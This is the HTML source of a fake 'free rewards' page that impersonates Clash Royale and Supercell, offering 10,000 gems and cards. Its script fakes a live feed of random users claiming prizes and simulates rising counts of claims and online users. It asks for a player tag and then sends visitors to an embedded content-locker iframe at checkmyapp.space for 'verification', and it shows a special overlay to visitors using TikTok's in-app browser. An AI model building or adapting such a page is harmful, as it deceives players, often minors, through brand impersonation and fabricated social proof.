<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - Golden Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-gold: #ffcc00;
            --cr-white: #ffffff;
            --cr-light-blue: #00a2ff;
            --cr-dark-blue: #004a8d;
            --card-bg: rgba(255, 255, 255, 0.95);
            --footer-bg: #111111;
        }

        body {
            margin: 0; padding: 0;
            background: radial-gradient(circle at center, var(--cr-light-blue) 0%, var(--cr-dark-blue) 100%);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            overflow-x: hidden;
        }

        /* --- TIKTOK OVERLAY --- */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: cover; }

        /* Live Bar */
        .live-bar { 
            background: rgba(255, 255, 255, 0.2); 
            padding: 10px 0; font-size: 13px; 
            border-bottom: 2px solid var(--cr-gold); 
            height: 25px; backdrop-filter: blur(5px);
        }
        #liveText { transition: all 0.5s ease; display: inline-block; color: var(--cr-gold); text-shadow: 1px 1px #000; }

        .logo-container { margin: 25px 0; }
        .logo { width: 180px; filter: drop-shadow(0 8px 15px rgba(0,0,0,0.4)); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        .stats-panel {
            background: rgba(255, 255, 255, 0.1); border: 2px solid var(--cr-gold);
            border-radius: 20px; display: inline-flex; gap: 40px; padding: 15px 40px; margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }
        .stat-box { display: flex; flex-direction: column; align-items: center; }
        .stat-val { font-size: 26px; color: var(--cr-gold); text-shadow: 2px 2px #000; }

        .container {
            width: 95%; max-width: 550px; margin: 0 auto;
            background: rgba(255, 255, 255, 0.1); border-radius: 30px; padding: 20px;
        }
        
        /* --- GRID 3 COLUMNS (Brawl Style) --- */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }

        .card {
            background: var(--cr-white); border: 3px solid var(--cr-gold); border-radius: 15px;
            padding: 12px 5px; position: relative; overflow: hidden;
            box-shadow: 0 6px 15px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center;
            transition: 0.3s;
        }
        .card:hover { transform: scale(1.05); }

        /* Sunray wrapping the image */
        .sunrays {
            position: absolute; top: 50%; left: 50%; width: 200%; height: 200%;
            background: repeating-conic-gradient(from 0deg, transparent 0deg 20deg, rgba(255, 204, 0, 0.15) 20deg 40deg);
            animation: rotateSun 10s linear infinite; z-index: 0; transform-origin: center;
        }
        @keyframes rotateSun { from { transform: translate(-50%, -50%) rotate(0deg); } to { transform: translate(-50%, -50%) rotate(360deg); } }

        .item-name { font-size: 10px; color: var(--cr-dark-blue); z-index: 2; text-transform: uppercase; height: 25px; overflow: hidden; }
        .img-box { height: 70px; display: flex; align-items: center; justify-content: center; z-index: 2; margin: 5px 0; }
        .item-img { max-width: 90%; max-height: 100%; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.2)); }
        .price-line { color: #28a745; font-size: 11px; z-index: 2; margin-bottom: 5px; }

        .btn-claim {
            background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%);
            border: none; border-bottom: 4px solid #b36b00; border-radius: 8px;
            color: white; font-size: 13px; padding: 6px 0; width: 95%; cursor: pointer; z-index: 2;
            font-family: 'Lilita One', cursive; text-shadow: 1px 1px 0 #000;
        }

        /* --- MODALS (Brawl Box Style) --- */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.85);
            display: none; justify-content: center; align-items: center; z-index: 1000;
            backdrop-filter: blur(10px);
        }
        .modal-box {
            background: var(--cr-white); width: 85%; max-width: 400px;
            border: 6px solid var(--cr-gold); border-radius: 25px;
            padding: 30px 15px; box-shadow: 0 10px 0 #b36b00; color: var(--cr-dark-blue);
        }
        
        .modal-input { 
            background: #f0f0f0; border: 3px solid var(--cr-gold); border-radius: 15px;
            width: 90%; padding: 15px; font-family: 'Lilita One'; font-size: 22px; 
            text-align: center; color: var(--cr-dark-blue); outline: none; margin: 20px 0;
        }

        .btn-continue {
            background: linear-gradient(180deg, #7cfc00 0%, #4ea100 100%);
            border: none; border-bottom: 6px solid #2d5a00; border-radius: 12px;
            color: white; font-family: 'Lilita One'; font-size: 28px;
            padding: 10px 0; width: 100%; cursor: pointer; text-shadow: 2px 2px 0 #000;
        }

        .locker-frame {
            background: #000; border: 4px solid var(--cr-gold); border-radius: 20px;
            width: 100%; height: 400px; margin-top: 15px; overflow: hidden;
        }

        footer { margin-top: 60px; background: var(--footer-bg); padding: 40px 20px; color: white; }
        .sc-logo-footer { width: 120px; margin-top: 20px; filter: brightness(1.5); }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>

    <div class="live-bar">
        <span id="liveText">👑 <b>Mohamed_CR</b> claimed <span>10,000 GEMS!</span></span>
    </div>

    <div class="logo-container">
        <img src="https://link.clashroyale.com/images/cr-logo-white.png" class="logo">
    </div>

    <div class="stats-panel">
        <div class="stat-box">
            <span style="font-size: 10px; color: #fff;">LIVE REWARDS</span>
            <span class="stat-val" id="claimed">4,281</span>
        </div>
        <div class="stat-box">
            <span style="font-size: 10px; color: #fff;">ONLINE USERS</span>
            <span class="stat-val" id="online">1,402</span>
        </div>
    </div>

    <div class="container">
        <h2 style="color: var(--cr-gold); text-shadow: 2px 2px #000; margin-bottom: 20px;">CHOOSE REWARD</h2>
        <div class="grid" id="mainGrid"></div>
    </div>

    <!-- Modal 1 -->
    <div class="modal-overlay" id="modalTag">
        <div class="modal-box">
            <h2 style="margin:0">CONNECT ACCOUNT</h2>
            <p>Enter your Player Tag or Username</p>
            <input type="text" class="modal-input" id="playerTag" placeholder="#P8LVQ..." maxlength="12">
            <button class="btn-continue" onclick="goToLocker()">CONFIRM</button>
        </div>
    </div>

    <!-- Modal 2 -->
    <div class="modal-overlay" id="modalLocker">
        <div class="modal-box">
            <h2 style="margin:0">VERIFICATION</h2>
            <p style="font-size: 12px;">Complete one task to receive your selected reward.</p>
            <div class="locker-frame">
                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <div style="max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
            <div style="text-align: left; font-family: sans-serif; font-size: 13px;">
                <a href="#" style="color:white; display:block; margin: 5px 0;">Privacy Policy</a>
                <a href="#" style="color:white; display:block; margin: 5px 0;">Terms of Service</a>
                <p style="color: #666; margin-top: 15px;">&copy; Supercell Oy 2026</p>
            </div>
            <img src="https://supercell.com/images/800/logo_supercell@2x.png" class="sc-logo-footer">
        </div>
    </footer>

    <script>
        // Data using YOUR actual filenames from GitHub
        const rewardsData = [
            {n: "10,000 GEMS", q: "X1", img: "gems5000.PNG"}, // Using gems5000 as base
            {n: "MEGA BALLOON", q: "X1", img: "Balloon.PNG"},
            {n: "EVO KNIGHT", q: "X1", img: "evoknight.PNG"},
            {n: "LEGENDARY CHEST", q: "X1", img: "chest5stars.PNG"},
            {n: "MAGIC ARCHER", q: "X1", img: "archer.PNG"},
            {n: "PRINCE", q: "X1", img: "prince.PNG"},
            {n: "WIZARD", q: "X1", img: "wizard.PNG"},
            {n: "MUSKETEER", q: "X1", img: "musketeer.PNG"},
            {n: "GIANT", q: "X1", img: "giant.PNG"},
            {n: "GOLEM", q: "X1", img: "golem.PNG"},
            {n: "MINI P.E.K.K.A", q: "X1", img: "minipekka.PNG"},
            {n: "BARBARIAN BARREL", q: "X1", img: "barrel.PNG"}
        ];

        const grid = document.getElementById('mainGrid');
        rewardsData.forEach(r => {
            grid.innerHTML += `<div class="card">
                <div class="sunrays"></div>
                <div class="item-name">${r.n}</div>
                <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/100?text=CR'"></div>
                <div class="price-line">FREE REWARD</div>
                <button class="btn-claim" onclick="openTagModal()">CLAIM</button>
            </div>`;
        });

        // Live Notifications
        const userNames = ["Daniel_Ulta", "Zeneex_99", "CR_King", "Alpha_Jkk", "Super_Pro", "Elite_Royale"];
        const prizes = ["10,000 Gems", "Legendary Chest", "Evo Knight", "Wizard Skin"];
        setInterval(() => {
            const liveText = document.getElementById('liveText');
            liveText.style.opacity = '0';
            setTimeout(() => {
                const name = userNames[Math.floor(Math.random() * userNames.length)];
                const prize = prizes[Math.floor(Math.random() * prizes.length)];
                liveText.innerHTML = `👑 <b>${name}</b> claimed <span>${prize}!</span>`;
                liveText.style.opacity = '1';
            }, 500);
        }, 4000);

        function openTagModal() { document.getElementById('modalTag').style.display = 'flex'; }
        function goToLocker() {
            if(document.getElementById('playerTag').value.length > 2) {
                document.getElementById('modalTag').style.display = 'none';
                document.getElementById('modalLocker').style.display = 'flex';
            }
        }

        // Online Stats Simulator
        setInterval(() => {
            const cl = document.getElementById('claimed');
            const on = document.getElementById('online');
            if(cl) cl.innerText = (parseInt(cl.innerText.replace(',','')) + Math.floor(Math.random()*3)).toLocaleString();
            if(on) on.innerText = (parseInt(on.innerText.replace(',','')) + Math.floor(Math.random()*5-2)).toLocaleString();
        }, 3000);

        window.addEventListener("load", () => {
            if (/TikTok|musical_ly|Bytedance/i.test(navigator.userAgent)) {
                document.getElementById("ttOverlay").style.display = "block";
            }
        });
    </script>
</body>
</html>
